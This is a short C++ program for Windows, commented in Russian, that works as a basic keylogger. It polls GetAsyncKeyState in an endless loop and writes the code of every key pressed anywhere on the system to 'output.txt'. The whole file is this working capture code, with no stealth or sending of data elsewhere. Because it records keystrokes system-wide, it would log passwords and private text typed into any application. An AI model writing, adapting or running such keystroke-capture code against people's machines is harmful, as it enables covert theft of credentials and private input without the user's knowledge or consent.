#include <iostream>
#include <fstream>
#include <Windows.h> // Для работы с клавиатурным вводом

int main() {
    std::ofstream logFile("output.txt"); // Открываем файл для записи

    if (!logFile.is_open()) {
        std::cerr << "Ошибка открытия файла!" << std::endl;
        return 1;
    }

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) { // Проверяем, была ли нажата клавиша
                logFile << key << std::endl; // Записываем код клавиши в файл
            }
        }
    }

    logFile.close(); // Закрываем файл

    return 0;
}
